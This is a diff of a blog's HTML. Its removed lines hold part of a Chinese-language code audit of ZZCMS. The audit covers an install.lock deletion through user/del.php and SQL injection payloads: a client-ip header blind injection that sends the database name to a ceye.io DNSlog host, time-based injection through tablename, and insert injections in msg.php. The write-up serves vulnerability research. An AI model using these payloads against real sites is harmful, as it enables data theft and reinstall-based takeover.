-<p>那我们就需要找一下在哪里可以插入或者修改zzcms_main表中的img字段值的地方:<br>在<code>user\zssave.php</code>中找见:<br><img src="http://static.zybuluo.com/chhyx/p19ih7qu5a3h93k4e9zqmrp0/image_1cqipskup1f3i13hmmbp1tcc1om48k.png" alt="image_1cqipskup1f3i13hmmbp1tcc1om48k.png-57.4kB"></p>
-<p>那利用就很简单了:<br>先访问:<code>http://127.0.0.1:81/user/zssave.php</code><br>添加时将<code>$img</code>值(或<code>$flv</code>)改为想删除的文件<code>xinstall/install.lock</code>(从下标为1开始取值)<br>然后再访问:</p>
-<pre><code>http://127.0.0.1:81/user/del.php   
-post:id=1&amp;tablename=zzcms_main
-</code></pre><p>即可成功删除<code>install.lock</code>文件,这里的<code>id</code>同样需要爆破</p>
-<p>在<code>user\del.php</code>这个文件下另外一处:</p>
-<p><img src="http://static.zybuluo.com/chhyx/2br5zkprbcxioqp7w223w9h1/image_1cqip94rk1hrtkj2q7u19ud12r63d.png" alt="image_1cqip94rk1hrtkj2q7u19ud12r63d.png-69.5kB"></p>
-<p>在<code>licence_sace.php</code>有往<code>zzcms_licence</code>表写数据的操作<br><img src="http://static.zybuluo.com/chhyx/skavh97q5jwknwnxeybg8p5y/image_1cqipe3aq3iavumtf215i777g6q.png" alt="image_1cqipe3aq3iavumtf215i777g6q.png-118.8kB"><br>操作同上即可利用。</p>
-<p>##<strong>3.多处Sql注入:</strong><br><strong>A.HTTP_CLIENT_IP 注入</strong><br>获取ip的函数<code>getip()</code>无过滤,与笔者前几天分析的<a href="https://p0rz9.github.io/2018/10/21/APPCMS%E8%AF%A6%E7%BB%86%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">代码审计 | APPCMS详细审计</a>中的注入类似。</p>
-<pre><code>#inc\function.php    getip()
-function getip(){ 
-if (getenv(&quot;HTTP_CLIENT_IP&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_CLIENT_IP&quot;), &quot;unknown&quot;)) 
-$ip = getenv(&quot;HTTP_CLIENT_IP&quot;); 
-else if (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_X_FORWARDED_FOR&quot;), &quot;unknown&quot;)) 
-$ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;); 
-else if (getenv(&quot;REMOTE_ADDR&quot;) &amp;&amp; strcasecmp(getenv(&quot;REMOTE_ADDR&quot;), &quot;unknown&quot;)) 
-$ip = getenv(&quot;REMOTE_ADDR&quot;); 
-else if (isset($_SERVER[&apos;REMOTE_ADDR&apos;]) &amp;&amp; $_SERVER[&apos;REMOTE_ADDR&apos;] &amp;&amp; strcasecmp($_SERVER[&apos;REMOTE_ADDR&apos;], &quot;unknown&quot;)) 
-$ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; 
-else 
-$ip = &quot;unknown&quot;; 
-return ($ip); 
-} 
-</code></pre><p>然后直接搜索用到<code>getip()</code>函数的地方进行利用。</p>
-<pre><code>user\logincheck.php
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/syx67osq7fldj7gt1kzbasgk/image_1cqir6v841j0be6219ru1gheu259e.png" alt="image_1cqir6v841j0be6219ru1gheu259e.png-131.4kB"></p>
-<p>因为这里时无回显的盲注,我们用DNSlog来快速获取数据,<br>不清楚怎么使用的可参考笔者之前的文章。</p>
-<pre><code>client-ip: 1.1.1.1&apos; and ((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxxxx.ceye.io\\abc&apos;))))#
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/9gyfrk1tgqc2p1dac1e5hea8/image_1cqis1ttj13t7uibddvstn1kbb9r.png" alt="image_1cqis1ttj13t7uibddvstn1kbb9r.png-104.1kB"></p>
-<p>剩下的还有几处利用点,但大多类似,就不再赘述。</p>
-<p><strong>B.$tablename注入</strong><br>将传入的变量<code>$tablename</code>直接拼接到sql语句中,且无引号包裹,<br><img src="http://static.zybuluo.com/chhyx/25nmbl349o2copgl8mym97tv/image_1cqkek8v7b68ib12kb1k691kjq9.png" alt="image_1cqkek8v7b68ib12kb1k691kjq9.png-18.1kB"></p>
-<p>因为这里并无回显,所以只能利用延时注入或者dnslog带入的方式</p>
-<pre><code>http://127.0.0.1:81/user/del.php
-post:id=2&amp;tablename=zzcms_licence+where+title=100+or+if(1,sleep(2),1)--+
-</code></pre><p>与上面<code>getip()</code>类似。</p>
-<p><strong>C.stripfxg使用错误导致注入</strong><br>在该CMS中还有个危险函数<code>stripfxg()</code>,他的作用就是将已经过滤的数据还原:<br><img src="http://static.zybuluo.com/chhyx/btb1zj08yl388ipts0od8uiu/image_1cqkd93hvihq1usv1spa10ti1iuf2g.png" alt="image_1cqkd93hvihq1usv1spa10ti1iuf2g.png-51.3kB"></p>
-<p>是个危险函数无疑了。搜索调用该函数且带入数据库的地方,找到一处<code>user\msg.php</code>:<br><img src="http://static.zybuluo.com/chhyx/v42tg9owuqsbrtm39wfm3din/image_1cqkct38o1ckp1qo819809l9323.png" alt="image_1cqkct38o1ckp1qo819809l9323.png-123.8kB"></p>
-<p>这里是<code>insert</code>注入,我们可以利用多伪造一组数据的方法,<br>与<a href="https://p0rz9.github.io/2018/10/21/APPCMS%E8%AF%A6%E7%BB%86%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/21/APPCMS详细审计/</a>同理：</p>
-<pre><code>http://127.0.0.1:81/user/msg.php?action=savedata&amp;saveas=add
-POST:info_content=xxxxxxx&apos;),((select user()))#&amp;Submit=%E6%8F%90%E4%BA%A4
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/vrxf7778iix0qri6wn4mpgbv/image_1cqke5u0k1fq4l037v810pq13h13d.png" alt="image_1cqke5u0k1fq4l037v810pq13h13d.png-137.1kB"></p>
-<p>还有就是可利用延时注入:</p>
-<pre><code>http://127.0.0.1:81/user/msg.php?action=savedata&amp;saveas=add
-POST:info_content=xxxxxxx&apos;^if(1,sleep(6),0))#&amp;Submit=%E6%8F%90%E4%BA%A4
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/6p3jpkqie8rwnebvjw7veupg/image_1cqkclcimhv21lko1m8l11jtcrfm.png" alt="image_1cqkclcimhv21lko1m8l11jtcrfm.png-140.5kB"></p>
-<p>注入小技巧:</p>
-<pre><code>在碰到insert注入和update注入的时候,除了能够多伪造一组数据以外，还可以使用这种异或符号加上sleep函数来延时注入
-
-insert into user (content)VALUES(&apos;1&apos;^if(1,sleep(5),0))#
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/buipbf0dwmbusowquxf0yxmc/image_1cqkccjja1es612ksqkvs3j9pd9.png" alt="image_1cqkccjja1es612ksqkvs3j9pd9.png-10.7kB"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3028,7 +3712,7 @@ insert into user (content)VALUES(&apos;1&apos;^if(1,sleep(5),0))#
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-count">57</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -3041,7 +3725,7 @@ insert into user (content)VALUES(&apos;1&apos;^if(1,sleep(5),0))#
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
